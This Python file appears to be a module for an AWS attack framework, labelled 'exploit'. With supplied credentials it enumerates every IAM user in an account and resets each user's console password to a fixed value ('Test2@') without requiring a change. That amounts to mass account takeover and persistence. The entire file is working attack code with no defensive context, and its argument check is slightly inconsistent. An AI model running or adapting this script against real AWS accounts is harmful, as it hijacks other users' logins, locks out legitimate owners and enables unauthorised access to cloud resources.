import boto3
import argparse
from botocore.exceptions import ClientError


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'exploit',

    # Name and any other notes about the author
    'author': 'Gregory Fuentes',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Enumerates and updates login profile for other users',

    # Description about what the module does and how it works
    'description': 'The module is used to enumerate users in an AWS account and update their AWS IAM login profile with a new password that can be enumerated against later',
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--access-key-id', required=False, default=None, help='Enter access key for AWS IAM user that will be enumerated')
parser.add_argument('--secret-access-key', required=False, default=False, help='Enter secret access key for AWS IAM user that will be enumerated against')



def Enum(args):
    temp_password = "Test2@"
    print("Connecting to given AWS IAM profile..............")
    try:
        client = boto3.client('iam',aws_access_key_id=args.access_key_id,aws_secret_access_key=args.secret_access_key,aws_session_token="")
        response = client.list_users(MaxItems=123)
        print("Response: ")
        print(response)
        print("---------------------")
        for user in response["Users"]:
            name = user['UserName']
            print("-------------------")
            print("Username: " + name)
            try: 
                response2 = client.update_login_profile(UserName=name,Password=temp_password,PasswordResetRequired=False)
                print(response2)                   
            except ClientError as error:
                code = error.response['Error']['Code']
                print('FAILURE: ')
                if code == 'UnauthorizedOperation':
                    print(' Problem logging')
                else:
                    print(' ' + code)    
    except ClientError as error:
        code = error.response['Error']['Code']
        print('FAILURE: ')
        if code == 'UnauthorizedOperation':
            print(' Problem logging')
        else:
            print(' ' + code)

def main():
    args = parser.parse_args()
    if args.access_key_id is False and args.secret_access_key is False:
        print("Please enter required values for parameters access key and secrety access key to begin enumeration.")
        return
    print('Starting AWS IAM enumeration..................')
    Enum(args)

if __name__ == "__main__":
    main()